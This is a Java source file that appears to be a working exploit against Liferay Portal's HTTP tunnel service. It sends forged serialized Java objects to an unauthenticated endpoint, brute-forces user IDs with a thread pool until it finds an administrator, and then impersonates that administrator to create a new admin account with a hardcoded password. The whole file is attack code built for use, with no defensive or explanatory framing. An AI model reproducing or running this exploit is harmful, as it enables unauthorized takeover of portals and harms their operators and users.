package nl.orange11.liferay;


import com.liferay.portal.kernel.util.MethodHandler;
import com.liferay.portal.kernel.util.MethodKey;
import com.liferay.portal.kernel.util.ObjectValuePair;
import com.liferay.portal.model.Role;
import com.liferay.portal.model.RoleConstants;
import com.liferay.portal.security.auth.HttpPrincipal;
import com.liferay.portal.service.ServiceContext;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.InputStreamRequestEntity;
import org.apache.commons.httpclient.methods.PostMethod;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


import java.io.*;
import java.lang.reflect.Field;
import java.util.*;
import java.util.concurrent.*;
import static java.lang.String.format;

public class Main {

    private static final Logger LOGGER = LoggerFactory.getLogger(Main.class);

    private static final String NEW_ADMIN_EMAIL = "littlebobby@tables.com";
    private static final String NEW_ADMIN_SCREENNAME = "littlebobby";

    private static final String NEW_ADMIN_PASSWORD = "s3cr3t";

    private static final String LIFERAY_HOST = "localhost";
    private static final int LIFERAY_PORT = 8080;

    public static final int THREAD_POOL_SIZE = 20;

    public static void main(String... args) throws Exception {

        LOGGER.info("Looking up the admin user, this might take a while.");

        FindAdminResult findAdminResult = findAdmin();

        LOGGER.info("Found the admin user : userId {}", findAdminResult.userId);

        createAdminAccount(findAdminResult);

        LOGGER.info("Created a new admin with email {}, screen name : {} and password {}", new Object[] {
                NEW_ADMIN_EMAIL, NEW_ADMIN_SCREENNAME, NEW_ADMIN_PASSWORD});

        LOGGER.info("You can log in now.");
    }

    private static void createAdminAccount(FindAdminResult adminInfo) throws IOException, ClassNotFoundException {

        MethodKey key = new MethodKey("com.liferay.portal.service.UserServiceUtil", "addUser",
                long.class, boolean.class, String.class, String.class, boolean.class, String.class, String.class,
                long.class, String.class, java.util.Locale.class, String.class, String.class, String.class,
                int.class, int.class, boolean.class, int.class, int.class, int.class, String.class, long[].class,
                long[].class, long[].class, long[].class, boolean.class, ServiceContext.class);

        MethodHandler methodHandler = new MethodHandler(key, adminInfo.companyId, false,
                NEW_ADMIN_PASSWORD, NEW_ADMIN_PASSWORD, false, NEW_ADMIN_SCREENNAME, NEW_ADMIN_EMAIL, 0L, "",
                Locale.ENGLISH, "bobby", "", "tables", 0, 0, true, 1, 1, 1980, "1337 h4x0r", new long[0], new long[0],
                new long[] { adminInfo.adminRoleId }, new long[0], false, new ServiceContext());

        executeRequest(adminInfo.userId, methodHandler);
    }

    private static <T> T executeRequest(long principalUserId, MethodHandler methodHandler)
            throws IOException, ClassNotFoundException {

        HttpPrincipal principal = createHttpPrincipal(String.valueOf(principalUserId));

        HttpClient httpClient = new HttpClient();

        PostMethod method = new PostMethod(format("http://%s:%d/?p_p_id=58&p_p_lifecycle=2" +
                "&p_p_resource_id=/api/liferay/", LIFERAY_HOST, LIFERAY_PORT));

        ObjectValuePair<HttpPrincipal, Object> objectValuePair =
                new ObjectValuePair<HttpPrincipal, Object>(principal, methodHandler);

        byte[] objectValuePairBytes = serialize(objectValuePair);
        method.setRequestEntity(new InputStreamRequestEntity(new ByteArrayInputStream(objectValuePairBytes)));

        try {
            httpClient.executeMethod(method);

            @SuppressWarnings({"unchecked", "UnnecessaryLocalVariable"})
            T result = (T) deserialize(method.getResponseBody());

            return result;
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            method.releaseConnection();
        }
    }

    private static FindAdminResult findAdmin() throws InterruptedException, ExecutionException {

        final ExecutorService executorPool = Executors.newFixedThreadPool(THREAD_POOL_SIZE);

        final CompletionService<FindAdminResult> completionService =
                new ExecutorCompletionService<FindAdminResult>(executorPool);

        UserIdGenerator userIdGenerator = new UserIdGenerator();

        try {
            // add as many callables as the thread pool size

            for (int i = 0; i < THREAD_POOL_SIZE; i++) {
                completionService.submit(new FindAdminCallable(userIdGenerator.next()));
            }

            // then add more as the tasks complete
            while (true) {
                FindAdminResult result = completionService.take().get();

                if (result != null) {
                    return result;
                }

                completionService.submit(new FindAdminCallable(userIdGenerator.next()));
            }

        } finally {
            executorPool.shutdown();
        }
    }


    private static byte[] serialize(Object object) {
        byte[] result;
        ObjectOutputStream os = null;
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            os = new ObjectOutputStream(baos);
            os.writeObject(object);
            os.flush();

            result = baos.toByteArray();

        } catch (IOException e) {
            throw new RuntimeException("Should never happen", e);
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                    LOGGER.error("Should not happen", e);
                }
            }
        }
        return result;
    }

    private static Object deserialize(byte[] bytes) throws ClassNotFoundException {
        ObjectInputStream in = null;
        try {
            in = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return in.readObject();
        } catch (IOException e) {
            throw new RuntimeException("Should never happen", e);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    LOGGER.error("Should not happen", e);
                }
            }
        }
    }

    private static HttpPrincipal createHttpPrincipal(String login) {
        try {
            HttpPrincipal principal = new HttpPrincipal("/whatever");
            // just hack it. Using the multi argument constructor will call PwdEncryptor which depends on a shitload of
            // liferay classes and it's dependencies
            Field field = HttpPrincipal.class.getDeclaredField("_login");
            field.setAccessible(true);
            field.set(principal, login);
            return principal;
        } catch (IllegalAccessException e) {
            throw new RuntimeException("Should never happen", e);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException("Should never happen", e);
        }
    }

    private static class FindAdminCallable implements Callable<FindAdminResult> {

        private final long userId;

        public FindAdminCallable(long userId) {
            this.userId = userId;
        }

        @Override
        public FindAdminResult call() throws Exception {
            MethodKey key = new MethodKey("com.liferay.portal.service.RoleServiceUtil", "getUserRoles",
                    long.class);

            MethodHandler methodHandler = new MethodHandler(key, userId);

            List<Role> roles = executeRequest(userId, methodHandler);

            for (Role role : roles) {
                if (RoleConstants.ADMINISTRATOR.equals(role.getName())) {
                    return new FindAdminResult(userId, role.getRoleId(), role.getCompanyId());
                }
            }
            return null;
        }
    }

    private static class FindAdminResult {
        // no need for getters and setters since it's private

        public final long userId;
        public final long adminRoleId;
        public final long companyId;

        private FindAdminResult(long userId,Long adminRoleId, Long companyId) {
            this.userId = userId;
            this.adminRoleId = adminRoleId;
            this.companyId = companyId;
        }
    }

    private static class UserIdGenerator {

        private long counter = 10000;

        public long next() {

            // try the 10000 - 12000 range first, it seems to be where mysql generates the default admin

            long result = counter;

            counter++;

            if (counter == 12000) {
                counter = 0;
            }
            if (counter == 10000) {
                counter = 12000;
            }

            return result;
        }
    }
}
